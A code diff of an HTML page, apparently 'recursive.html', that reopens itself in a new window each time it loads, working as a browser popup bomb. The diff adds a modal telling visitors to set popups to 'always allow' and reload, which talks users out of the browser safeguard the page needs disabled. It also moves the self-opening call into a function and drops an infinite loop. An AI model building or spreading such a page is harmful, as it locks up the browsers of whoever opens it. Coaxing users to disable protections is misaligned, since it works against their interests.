@@ -4,23 +4,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RECURSIVE</title>
+    <title>BK</title>
     <link rel="icon" href="x-symbol.svg" type="image/x-icon">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+        }
+    </script>
 </head>
+
+<div
+    class="fixed inset-0 p-4 flex flex-wrap justify-center items-center w-full h-full z-[1000] before:fixed before:inset-0 before:w-full before:h-full before:bg-[rgba(0,0,0,0.5)] overflow-auto font-[sans-serif]">
+    <div class="w-full max-w-lg bg-white shadow-lg rounded-lg p-6 relative">
+        <div class="flex items-center pb-3 border-b border-gray-300">
+            <h3 class="text-gray-800 text-xl font-bold flex-1">How to run</h3>
+            
+        </div>
+
+        <div class="my-6">
+            <p class="text-gray-600 text-sm leading-relaxed">Click on the permissions to the right of the URL asking for popups.</p>
+            <p class="text-gray-600 text-sm leading-relaxed mt-2">Select "always allow".</p>
+            <p class="text-gray-600 text-sm leading-relaxed mt-2">Reload this page</p>
+        </div>
+
+        <div class="border-t border-gray-300 pt-6 flex justify-end gap-4">
+            
+        </div>
+    </div>
+</div>
 
 <body>
     <a id="run" href="recursive.html" style="display: none;">run me</a>
     <script>
-        window.open('recursive.html')
         setInterval(run(), 100)
         let counter = 0;
         function run() {
+            window.open('recursive.html')
             counter++;
             document.title = counter;
-        }
-        while (true) {
             Math.sqrt(Math.random());
         }
+
     </script>
 </body>
 
